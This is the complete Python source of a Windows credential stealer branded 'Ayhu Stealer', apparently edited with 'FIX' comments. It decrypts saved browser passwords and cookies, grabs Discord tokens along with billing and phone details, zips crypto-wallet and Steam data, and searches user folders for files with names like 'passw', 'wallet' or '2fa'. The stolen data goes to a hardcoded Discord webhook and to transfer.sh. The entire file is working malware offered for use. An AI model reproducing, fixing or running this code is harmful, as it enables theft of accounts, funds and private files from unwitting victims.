import os
import threading
import traceback
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load, loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from contextlib import contextmanager
import time
import shutil
from zipfile import ZipFile
import random
import subprocess


# ===================== CONFIG =====================
DEBUG = True        # False = silent, True = print every skipped line
VERBOSE = True      # False = no [ayhu] progress trace
PAUSE = True        # keep console open at the end (set False in a debugger)
USE_TRUST_FACTOR = False   # True = skip zip/kiwi when google cookies exist
# ==================================================


# ===================== SAFETY NET =====================
ERRS = []


def say(msg):
    if VERBOSE:
        print(f"[ayhu] {msg}", flush=True)


def _log(label, e):
    msg = f"{label} -> {type(e).__name__}: {e}"
    ERRS.append(msg)
    if DEBUG:
        print(f"[!] skipped: {msg}", flush=True)


def step(fn):
    """Decorator: function can never crash the program, returns None on error."""
    def wrapper(*args, **kwargs):
        try:
            return fn(*args, **kwargs)
        except Exception as e:
            _log(getattr(fn, "__name__", "?"), e)
            return None
    wrapper.__name__ = getattr(fn, "__name__", "wrapped")
    return wrapper


@contextmanager
def skip(label=""):
    """with skip('read file'): ... -> on error, log and continue."""
    try:
        yield
    except Exception as e:
        _log(label or "block", e)


def safe(label, fn, *a, **kw):
    """Inline call that cannot raise."""
    try:
        return fn(*a, **kw)
    except Exception as e:
        _log(label, e)
        return None
# ======================================================


#  KANI
#

hook = "https://discord.com/api/webhooks/1562590406414172222/Y4V3VqSIAhglMWBCaY-Ziqg4YcxWQXo0QkhG_TkTXvvtvC--S8MQDtkFiPcIN88BXW2D"
DETECTED = False


@step
def getip():
    ip = "None"
    with skip("getip urlopen"):
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    return ip


# ---------- dependencies ----------
requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try:
        __import__(modl[0])
    except Exception:
        say(f"installing {modl[1]} ...")
        with skip(f"pip install {modl[1]}"):
            subprocess.run([executable, "-m", "pip", "install", modl[1]], check=False)
        with skip(f"re-import {modl[0]}"):
            __import__(modl[0])

try:
    import requests
except Exception as e:
    _log("import requests", e)
    requests = None

try:
    from Crypto.Cipher import AES
except Exception as e:
    _log("import AES", e)
    AES = None


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]


@step
def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


@step
def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy),
                                         None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)
    return None


@step
def DecryptValue(buff, master_key=None):
    if master_key is None or AES is None or buff is None:
        return None
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    return None


@step
def LoadRequests(methode, url, data='', files='', headers=''):
    if requests is None:
        return None
    for i in range(8):  # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except Exception as e:
            _log("LoadRequests", e)
    return None


@step
def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except Exception as e:
            _log("LoadUrlib", e)
    return None


@step
def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    if not USE_TRUST_FACTOR:
        DETECTED = False          # matches the old (always-False) behaviour
        return DETECTED
    tim = re.findall(r"\.google\.com", str(Cookies))
    DETECTED = len(tim) > 0        # was `len(tim) < -1` -> never True
    return DETECTED


@step
def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources",
                                            headers=headers)).read().decode())
    except Exception as e:
        _log("GetBilling", e)
        return False

    if billingjson == []:
        return " -"

    billing = ""
    for methode in billingjson:
        with skip("billing loop"):
            if methode["invalid"] == False:
                if methode["type"] == 1:
                    billing += ":credit_card:"
                elif methode["type"] == 2:
                    billing += ":parking: "
    return billing


@step
def GetBadge(flags):
    if flags == 0:
        return ''

    OwnedBadges = ''
    badgeList = [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2, 'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]
    return OwnedBadges


@step
def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson:
        phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone


@step
def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except Exception:
        return False


@step
def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    info = GetTokenInfo(token)
    if not info:
        return

    username, hashtag, email, idd, pfp, flags, nitro, phone = info

    if pfp == None:
        pfp = "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '':
        nitro = " -"

    say(f"token hit -> {username}#{hashtag} ({idd})")

    data = {
        "content": f'Found in `{path}`',
        "embeds": [
            {
                "color": 14406413,
                "fields": [
                    {"name": ":rocket: Token:",
                     "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"},
                    {"name": ":envelope: Email:", "value": f"`{email}`", "inline": True},
                    {"name": ":mobile_phone: Phone:", "value": f"{phone}", "inline": True},
                    {"name": ":globe_with_meridians: IP:", "value": f"`{getip() or 'None'}`", "inline": True},
                    {"name": ":beginner: Badges:", "value": f"{nitro}{badge}", "inline": True},
                    {"name": ":credit_card: Billing:", "value": f"{billing}", "inline": True}
                ],
                "author": {"name": f"{username}#{hashtag} ({idd})", "icon_url": f"{pfp}"},
                "footer": {"text": "@Ayhu Stealer",
                           "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"},
                "thumbnail": {"url": f"{pfp}"}
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg",
        "username": "Ayhu Stealer",
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


@step
def Reformat(listt):
    e = re.findall(r"(\w+[a-z])", listt)
    while "https" in e:
        e.remove("https")
    while "com" in e:
        e.remove("com")
    while "net" in e:
        e.remove("net")
    return list(set(e))


@step
def upload(name, tk=''):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "kiwi":
        data = {
            "content": '',
            "embeds": [
                {
                    "color": 14406413,
                    "fields": [{"name": "Interesting files found on user PC:", "value": tk or "-"}],
                    "author": {"name": "Ayhu | File Stealer"},
                    "footer": {"text": "@Ayhu Stealer",
                               "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"}
                }
            ],
            "avatar_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg",
            "attachments": []
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    path = name

    # FIX: read into memory and close the handle immediately,
    # otherwise the file stays locked and os.remove() of the zip fails on Windows
    raw = None
    with skip("read file for upload"):
        with open(path, 'rb') as fh:
            raw = fh.read()
    if raw is None:
        return
    files = {'file': (os.path.basename(path), raw)}

    if "wppassw" in name:
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in (rrr or []))

        data = {
            "content": '',
            "embeds": [
                {
                    "color": 14406413,
                    "fields": [{"name": "Found:", "value": ra or "-"}],
                    "author": {"name": "HADIS ON TOP"},
                    "footer": {"text": "@amirhadis",
                               "icon_url": "https://media.discordapp.net/attachments/1560305766039027712/1562473476194050203/BA5A8456-9FC3-411F-822D-D441442DE090.png?ex=6ada1e52&is=6ad8ccd2&hm=60bff7f6c250e1d8e1208efff74a5e366dd28993395a58ce266d58e2905cab55&=&format=webp&quality=lossless&width=512&height=512"}
                }
            ],
            "avatar_url": "https://media.discordapp.net/attachments/1560305766039027712/1562473476194050203/BA5A8456-9FC3-411F-822D-D441442DE090.png?ex=6ada1e52&is=6ad8ccd2&hm=60bff7f6c250e1d8e1208efff74a5e366dd28993395a58ce266d58e2905cab55&=&format=webp&quality=lossless&width=512&height=512",
            "attachments": []
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    if "wpcook" in name:
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in (rrrrr or []))

        data = {
            "content": '',
            "embeds": [
                {
                    "color": 14406413,
                    "fields": [{"name": "Found:", "value": rb or "-"}],
                    "author": {"name": "HADIS ON TOP"},
                    "footer": {"text": "@amirhadis",
                               "icon_url": "https://media.discordapp.net/attachments/1560305766039027712/1562473476194050203/BA5A8456-9FC3-411F-822D-D441442DE090.png?ex=6ada1e52&is=6ad8ccd2&hm=60bff7f6c250e1d8e1208efff74a5e366dd28993395a58ce266d58e2905cab55&=&format=webp&quality=lossless&width=512&height=512"}
                }
            ],
            "avatar_url": "https://media.discordapp.net/attachments/1560305766039027712/1562473476194050203/BA5A8456-9FC3-411F-822D-D441442DE090.png?ex=6ada1e52&is=6ad8ccd2&hm=60bff7f6c250e1d8e1208efff74a5e366dd28993395a58ce266d58e2905cab55&=&format=webp&quality=lossless&width=512&height=512",
            "attachments": []
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    LoadRequests("POST", hook, files=files)


@step
def writeforfile(data, name):
    path = os.getenv("TEMP") + rf"\wp{name}.txt"          # FIX: raw string
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--HADIS BEST-->\n\n")
        for line in data:
            if line:                                       # FIX: line[0] blew up on empty
                with skip("write line"):
                    f.write(f"{line}\n")


Tokens = set()                                             # FIX: was a string


@step
def getToken(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            lines = []                                     # FIX: was unbound on read error
            with skip(f"read {file}"):
                lines = [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]
            for line in lines:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        if checkToken(token):
                            if token not in Tokens:
                                Tokens.add(token)
                                uploadToken(token, path)


Passw = []
paswWords = []
cookiWords = []


@step
def getPassw(path, arg):
    global Passw
    if not os.path.exists(path):
        return

    pathC = path + arg + "/Login Data"
    with skip("Login Data stat"):
        if os.stat(pathC).st_size == 0:
            return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    with skip("copy Login Data"):
        shutil.copy2(pathC, tempfold)

    conn = cursor = None
    data = None                                            # FIX: was unbound on sql error
    with skip("read Login Data"):
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
        data = cursor.fetchall()
    with skip("close db"):
        cursor.close()
        conn.close()
    with skip("rm temp db"):
        os.remove(tempfold)

    if not data:
        return

    pathKey = path + "/Local State"
    local_state = master_key = None
    with skip("read Local State"):
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = json_loads(f.read())
    with skip("decrypt master key"):
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        with skip("password row"):
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if old not in paswWords:
                            paswWords.append(old)
                Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
    writeforfile(Passw, 'passw')
    say(f"passwords from {os.path.basename(os.path.dirname(pathC)) or path}: {len(data)}")


Cookies = []


@step
def getCookie(path, arg):
    global Cookies
    if not os.path.exists(path):
        return

    pathC = path + arg + "/Cookies"
    with skip("Cookies stat"):
        if os.stat(pathC).st_size == 0:
            return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    with skip("copy Cookies"):
        shutil.copy2(pathC, tempfold)

    conn = cursor = None
    data = None                                            # FIX: was unbound on sql error
    with skip("read Cookies"):
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        data = cursor.fetchall()
    with skip("close db"):
        cursor.close()
        conn.close()
    with skip("rm temp db"):
        os.remove(tempfold)

    if not data:
        return

    pathKey = path + "/Local State"
    local_state = master_key = None
    with skip("read Local State"):
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = json_loads(f.read())
    with skip("decrypt master key"):
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        with skip("cookie row"):
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if old not in cookiWords:
                            cookiWords.append(old)
                Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
    writeforfile(Cookies, 'cook')


@step
def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return

    pathC = path + arg

    pathKey = path + "/Local State"
    local_state = master_key = None
    with skip("read Local State"):
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = json_loads(f.read())
    with skip("decrypt master key"):
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb"):
            lines = []                                     # FIX: was unbound on read error
            with skip(f"read {file}"):
                lines = [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]
            for line in lines:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    with skip("decode discord token"):
                        tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if tokenDecoded and checkToken(tokenDecoded):
                            if tokenDecoded not in Tokens:
                                Tokens.add(tokenDecoded)
                                uploadToken(tokenDecoded, path)


@step
def ZipThings(path, arg, procc):
    pathC = path
    name = arg

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        with skip("metamask name"):
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC):
        return

    with skip(f"taskkill {procc}"):
        subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
        time.sleep(0.6)          # give the browser a moment to release the files

    if "Wallet" in arg or "NationsGlory" in arg:
        with skip("wallet name"):
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"):
            return
        found = False
        with skip("steam vdf"):
            with open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8") as f:
                data = f.readlines()
            for l in data:
                if 'RememberPassword"\t\t"1"' in l:
                    found = True
        if found == False:
            return
        name = arg

    ok = False
    with skip("zip create"):
        with ZipFile(f"{pathC}/{name}.zip", "w") as zf:   # FIX: context manager closes it
            for file in os.listdir(pathC):
                if ".zip" not in file:
                    with skip(f"zip add {file}"):
                        zf.write(pathC + "/" + file)
        ok = True

    if not ok:
        return

    say(f"zipped -> {name}")
    upload(f'{pathC}/{name}.zip')
    with skip("rm zip"):
        os.remove(f"{pathC}/{name}.zip")


@step
def GatherAll():
    say("scanning browsers + discord ...")

    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        [r"C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],   # FIX: raw string
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
    ]

    for patt in browserPaths:
        with skip("start token thread"):
            a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
            a.start()
            Threadlist.append(a)

    for patt in discordPaths:
        with skip("start discord thread"):
            a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
            a.start()
            Threadlist.append(a)

    for patt in browserPaths:
        with skip("start passw thread"):
            a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
            a.start()
            Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths:
        with skip("start cookie thread"):
            a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
            a.start()
            ThCokk.append(a)

    for thread in ThCokk:
        with skip("join cookie thread"):
            thread.join()

    say(f"cookies: {len(Cookies)} | passwords: {len(Passw)} | tokens: {len(Tokens)}")

    if Trust(Cookies) == True:
        return

    for patt in browserPaths:
        with skip("start zip thread"):
            threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()

    for patt in PathsToZip:
        with skip("start zip thread 2"):
            threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()

    for thread in Threadlist:
        with skip("join thread"):
            thread.join()

    for file in ["wppassw.txt", "wpcook.txt"]:
        upload(os.getenv("TEMP") + "\\" + file)


@step
def uploadToAnonfiles(path):
    try:
        with open(path, mode='rb') as fh:                  # FIX: handle was left open
            files = {"file": (os.path.basename(path), fh.read())}
        up = requests.post("https://transfer.sh/", files=files)
        return up.text
    except Exception as e:
        _log("uploadToAnonfiles", e)
        return False


KiwiFiles = []


@step
def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = []                                        # FIX: was unbound on listdir error
    with skip("list dir"):
        listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file):
            continue                      # was 'return' -> bug, skipped whole folder
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])


@step
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = []                                        # FIX: was unbound on listdir error
    with skip("list dir"):
        listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])


@step
def Kiwi():
    user = temp.split(r"\AppData")[0]                      # FIX: raw string
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = ["account", "acount", "passw", "secret"]

    key_wordsFiles = [
        "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret",
        "account", "acount", "paypal", "banque", "metamask", "wallet",
        "crypto", "exodus", "discord", "2fa", "code", "memo", "compte",
        "token", "backup", "seecret"
    ]

    say("kiwi file hunt started")

    wikith = []
    for patt in path2search:
        with skip("start kiwi thread"):
            kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles])
            kiwi.start()
            wikith.append(kiwi)
    return wikith


keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)',
    '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)',
    '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)',
    '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)',
    '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)',
    '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)',
    '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)',
    '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)',
    '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)',
    '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)',
    '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)',
    'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

cookiWords = []
paswWords = []


# ===================== MAIN =====================
@step
def main():
    GatherAll()

    if not Trust(Cookies):
        wikith = Kiwi() or []

        for thread in wikith:
            with skip("join kiwi thread"):
                thread.join()
        time.sleep(0.2)

        filetext = "\n"
        for arg in KiwiFiles:
            with skip("kiwi filetext"):
                if len(arg[2]) != 0:
                    foldpath = arg[1]
                    foldlist = arg[2]
                    filetext += f"• {foldpath}\n"
                    for ffil in foldlist:
                        a = ffil[0].split("/")
                        fileanme = a[len(a) - 1]
                        b = ffil[1]
                        filetext += f"... [{fileanme}]({b})\n"
                    filetext += "\n"
        upload("kiwi", filetext)


if __name__ == "__main__":
    say("Ayhu stealer started")
    try:
        main()
    except Exception as e:
        _log("main", e)
    finally:
        say(f"finished - {len(ERRS)} line(s) skipped over")
        for m in ERRS[:50]:
            print("   -", m)
        if PAUSE:
            with skip("pause"):
                input("\npress enter to close...")
